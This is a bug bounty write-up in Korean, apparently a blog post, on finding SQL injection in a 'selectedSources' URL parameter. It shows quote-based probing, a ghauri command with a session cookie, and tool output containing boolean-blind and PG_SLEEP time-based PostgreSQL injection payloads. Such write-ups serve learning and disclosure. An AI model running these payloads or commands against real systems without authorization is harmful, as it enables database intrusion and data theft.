{"pageProps":{"post":{"title":"첫 번째 유로 보상을 받은 방법","description":"","date":"2024-06-19 21:16","slug":"2024-06-19-HowIGotMyFirstBounty","content":"\n\n안녕하세요!\n\n이 글에서는 어떻게 첫 번째 €€€€ 현상금을 발견했는지에 대해 공유하겠습니다.\n\n처음에는 프로그램 범위가 다양한 서비스와 관련된 URL 집합이었기 때문에 기본 수동 현지 조사로 시작했습니다. 예를 들어:\n\n- https://ex.admin.service.example.com/\n\n<div class=\"content-ad\"></div>\n\nhttps://ex.service.service.example.com/\n\nhttps://ex.abc.service.example.com/\n\n또한, 프로그램은 역할을 테스트하기 위한 자격 증명을 제공했습니다.\n\n그런 다음 Burp를 통해 트래픽을 프록시하여 일반 사용자처럼 정렬기능을 제외한 다른 기능을 테스트하면서 사이트를 찾아보았지만, 흥미로운 기능은 없었습니다. 어떤 JS 파일에서 이미 본 흥미로운 매개변수들이 있었다는 것을 알게 되었습니다.\n\n<div class=\"content-ad\"></div>\n\n“SelectedSources, SelectedTemplateNames” 처음에는 아마도 데이터베이스에서 일부 데이터를 가져오는 것인줄 알았어요. 그래서 '“, ‘, \\', 와 같은 특수 문자를 입력하여 ' 이상을 찾는 테스트를 해보기로 결정했어요. 하나의 따옴표를 입력하자 500 HTTP 상태 코드(내부 서버 오류)를 받았고, 또 다른 따옴표를 더 추가하니 200 HTTP 상태 코드(정상)를 받았어요.\n\n```js\nhttps://ex.service.example.com/history?selectedSources=someSources' > 500\n```\n\n```js\nhttps://ex.service.example.com/history?selectedSources=someSources'' > 200\n```\n\n가끔은 역슬래시를 입력하여 확인하기도 해요. 그런데 여기서는 400 안 좋은 요청(Java 앱이었어요)을 받았어요.\n\n<div class=\"content-ad\"></div>\n\n```plaintext\n그 후에는 데이터베이스 버전을 추출하기 위해 sqlmap을 실행해 보았지만, 불행히도 sqlmap은 PostgreSQL이 DBMS임을 제외하고는 아무것도 추출하지 못했습니다. 그러나 포기하지 않고 대신 ghauri(https://github.com/r0oth3x49/ghauri.git)를 사용해 보았어요!\n\nghauri -u \"https://ex.service.example.com/history?selectedSources=someSources\" --dbms=postgres --cookie=\"JSESSIONID=09326D266052B6B0F7E391B7BBD3A284\" --dbs\n\nBoom! 🚀\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n[09:22:32] [INFO] 대상 URL에 대한 연결 테스트 중\nGhauri는 저장된 세션에서 다음 인젝션 지점을 재개했습니다:\n매개변수: selectedSources (GET)\n    유형: 블라인드 기반 boolean\n    제목: OR 블라인드 기반 - WHERE 또는 HAVING 절\n    페이로드: selectedSources=someSources') OR 06690=6690 OR ('04586'='4586\n    \n    유형: 블라인드 기반 시간\n    제목: PostgreSQL > 8.1 및 시간 기반 블라인드 (주석)\n    페이로드: selectedSources=someSources') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('04586'='4586\n    \n[09:22:33] [INFO] PostgreSQL 테스트 중\n[09:22:34] [INFO] PostgreSQL 확인 중\n[09:22:34] [INFO] 백엔드 DBMS는 PostgreSQL입니다\n[09:22:34] [INFO] 데이터베이스 이름 검색 중\n[09:22:34] [INFO] 데이터베이스 수 검색 중\n[09:22:51] [INFO] 검색된 결과: 3\n[09:26:01] [INFO] 검색된 결과: information_schema\n[09:27:51] [INFO] 검색된 결과: pg_catalog\n[09:28:57] [INFO] 검색된 결과: public\n사용 가능한 데이터베이스 [3]:\n[*] pg_catalog\n[*] public\n[*] information_schema\n```\n\n제보했고, 딱 한 시간 만에 트리저가 보고서를 회사에 전달했고, 그들은 취약점을 인정했습니다.\n\n<img src=\"/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png\" />\n\n다음 날, 회사에서 바운티를 수여했습니다.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-HowIGotMyFirstBounty_1.png)\n\n마지막으로, 이해하지 못하는 도구, 기술 또는 프로그램에만 집착하지 마세요. 그렇게 하면 탈진하게 될 거예요. 이미 인터넷은 취약점으로 가득 찬 곳이니까요.\n\nTwitter/X: https://x.com/MachIaVellill\n\nسَلامٌ\n","ogImage":{"url":"/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png"},"coverImage":"/assets/img/2024-06-19-HowIGotMyFirstBounty_0.png","tag":["Tech"],"readingTime":3},"content":"<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta content=\"width=device-width, initial-scale=1\" name=\"viewport\">\n</head>\n<body>\n<p>안녕하세요!</p>\n<p>이 글에서는 어떻게 첫 번째 €€€€ 현상금을 발견했는지에 대해 공유하겠습니다.</p>\n<p>처음에는 프로그램 범위가 다양한 서비스와 관련된 URL 집합이었기 때문에 기본 수동 현지 조사로 시작했습니다. 예를 들어:</p>\n<ul>\n<li><a href=\"https://ex.admin.service.example.com/\" rel=\"nofollow\" target=\"_blank\">https://ex.admin.service.example.com/</a></li>\n</ul>\n<p><a href=\"https://ex.service.service.example.com/\" rel=\"nofollow\" target=\"_blank\">https://ex.service.service.example.com/</a></p>\n<p><a href=\"https://ex.abc.service.example.com/\" rel=\"nofollow\" target=\"_blank\">https://ex.abc.service.example.com/</a></p>\n<p>또한, 프로그램은 역할을 테스트하기 위한 자격 증명을 제공했습니다.</p>\n<p>그런 다음 Burp를 통해 트래픽을 프록시하여 일반 사용자처럼 정렬기능을 제외한 다른 기능을 테스트하면서 사이트를 찾아보았지만, 흥미로운 기능은 없었습니다. 어떤 JS 파일에서 이미 본 흥미로운 매개변수들이 있었다는 것을 알게 되었습니다.</p>\n<p>“SelectedSources, SelectedTemplateNames” 처음에는 아마도 데이터베이스에서 일부 데이터를 가져오는 것인줄 알았어요. 그래서 '“, ‘, ', 와 같은 특수 문자를 입력하여 ' 이상을 찾는 테스트를 해보기로 결정했어요. 하나의 따옴표를 입력하자 500 HTTP 상태 코드(내부 서버 오류)를 받았고, 또 다른 따옴표를 더 추가하니 200 HTTP 상태 코드(정상)를 받았어요.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//ex.service.example.com/history?selectedSources=someSources' > 500</span>\n</code></pre>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-attr\">https</span>:<span class=\"hljs-comment\">//ex.service.example.com/history?selectedSources=someSources'' > 200</span>\n</code></pre>\n<p>가끔은 역슬래시를 입력하여 확인하기도 해요. 그런데 여기서는 400 안 좋은 요청(Java 앱이었어요)을 받았어요.</p>\n<pre><code class=\"hljs language-plaintext\">그 후에는 데이터베이스 버전을 추출하기 위해 sqlmap을 실행해 보았지만, 불행히도 sqlmap은 PostgreSQL이 DBMS임을 제외하고는 아무것도 추출하지 못했습니다. 그러나 포기하지 않고 대신 ghauri(https://github.com/r0oth3x49/ghauri.git)를 사용해 보았어요!\n\nghauri -u \"https://ex.service.example.com/history?selectedSources=someSources\" --dbms=postgres --cookie=\"JSESSIONID=09326D266052B6B0F7E391B7BBD3A284\" --dbs\n\nBoom! 🚀\n</code></pre>\n<pre><code class=\"hljs language-js\">[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">32</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 대상 <span class=\"hljs-variable constant_\">URL</span>에 대한 연결 테스트 중\n<span class=\"hljs-title class_\">Ghauri</span>는 저장된 세션에서 다음 인젝션 지점을 재개했습니다:\n매개변수: selectedSources (<span class=\"hljs-variable constant_\">GET</span>)\n    유형: 블라인드 기반 boolean\n    제목: <span class=\"hljs-variable constant_\">OR</span> 블라인드 기반 - <span class=\"hljs-variable constant_\">WHERE</span> 또는 <span class=\"hljs-variable constant_\">HAVING</span> 절\n    페이로드: selectedSources=someSources<span class=\"hljs-string\">') OR 06690=6690 OR ('</span><span class=\"hljs-number\">04586</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">4586</span>\n    \n    유형: 블라인드 기반 시간\n    제목: <span class=\"hljs-title class_\">PostgreSQL</span> > <span class=\"hljs-number\">8.1</span> 및 시간 기반 블라인드 (주석)\n    페이로드: selectedSources=someSources<span class=\"hljs-string\">') AND 4564=(SELECT 4564 FROM PG_SLEEP(6)) OR ('</span><span class=\"hljs-number\">04586</span><span class=\"hljs-string\">'='</span><span class=\"hljs-number\">4586</span>\n    \n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">33</span>] [<span class=\"hljs-variable constant_\">INFO</span>] <span class=\"hljs-title class_\">PostgreSQL</span> 테스트 중\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">34</span>] [<span class=\"hljs-variable constant_\">INFO</span>] <span class=\"hljs-title class_\">PostgreSQL</span> 확인 중\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">34</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 백엔드 <span class=\"hljs-variable constant_\">DBMS</span>는 <span class=\"hljs-title class_\">PostgreSQL</span>입니다\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">34</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 데이터베이스 이름 검색 중\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">34</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 데이터베이스 수 검색 중\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">51</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 검색된 결과: <span class=\"hljs-number\">3</span>\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">01</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 검색된 결과: information_schema\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">51</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 검색된 결과: pg_catalog\n[<span class=\"hljs-number\">09</span>:<span class=\"hljs-number\">28</span>:<span class=\"hljs-number\">57</span>] [<span class=\"hljs-variable constant_\">INFO</span>] 검색된 결과: public\n사용 가능한 데이터베이스 [<span class=\"hljs-number\">3</span>]:\n[*] pg_catalog\n[*] public\n[*] information_schema\n</code></pre>\n<p>제보했고, 딱 한 시간 만에 트리저가 보고서를 회사에 전달했고, 그들은 취약점을 인정했습니다.</p>\n<p>다음 날, 회사에서 바운티를 수여했습니다.</p>\n<p><img src=\"/assets/img/2024-06-19-HowIGotMyFirstBounty_1.png\" alt=\"이미지\"></p>\n<p>마지막으로, 이해하지 못하는 도구, 기술 또는 프로그램에만 집착하지 마세요. 그렇게 하면 탈진하게 될 거예요. 이미 인터넷은 취약점으로 가득 찬 곳이니까요.</p>\n<p>Twitter/X: <a href=\"https://x.com/MachIaVellill\" rel=\"nofollow\" target=\"_blank\">https://x.com/MachIaVellill</a></p>\n<p>سَلامٌ</p>\n</body>\n</html>\n"},"__N_SSG":true}